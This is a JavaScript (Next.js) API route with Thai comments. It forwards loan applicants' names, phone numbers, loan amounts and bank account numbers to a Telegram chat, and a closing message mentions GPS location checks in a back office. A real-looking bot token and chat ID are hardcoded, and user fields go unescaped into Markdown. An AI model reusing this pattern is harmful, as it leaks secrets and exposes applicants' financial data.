import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    // 1. รับข้อมูลคำขอกู้จากฟอร์มหน้าบ้าน
    const { fullName, phone, amount, loanType, bankName, accountNumber } = await request.json();

    // 2. ข้อมูล Telegram Bot และ Chat ID ของแอดมิน
    const BOT_TOKEN = '9203750510:AAFJhUvWRf4mOSozUSkz0I0I9Jca-xImuTo';
    const CHAT_ID = '1880260879';

    // 3. จัดรูปแบบข้อความแจ้งเตือนคำขอกู้ใหม่
    const message = `🚨 *มีคำขอกู้เงินใหม่เข้ามา (SUBLON819)*\n\n` +
      `👤 ชื่อ-นามสกุล: *${fullName}*\n` +
      `📞 เบอร์โทรศัพท์: \`${phone}\`\n` +
      `💵 ยอดเงินกู้: *฿${Number(amount).toLocaleString()}*\n` +
      `✍️ ประเภท: *${loanType}*\n` +
      `🏧 ธนาคารรับเงิน: ${bankName}\n` +
      `🔢 เลขบัญชี: \`${accountNumber}\`\n\n` +
      `_กรุณาตรวจสอบข้อมูล เอกสาร และพิกัด GPS ในระบบหลังบ้าน_`;

    // 4. ส่งข้อมูลไปยัง Telegram API
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const data = await response.json();

    if (!data.ok) {
      throw new Error(data.description || 'เกิดข้อผิดพลาดในการส่งแจ้งเตือน Telegram');
    }

    return NextResponse.json({ success: true, message: 'ส่งแจ้งเตือนเข้า Telegram สำเร็จ' });

  } catch (error) {
    console.error('Telegram Notify Error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}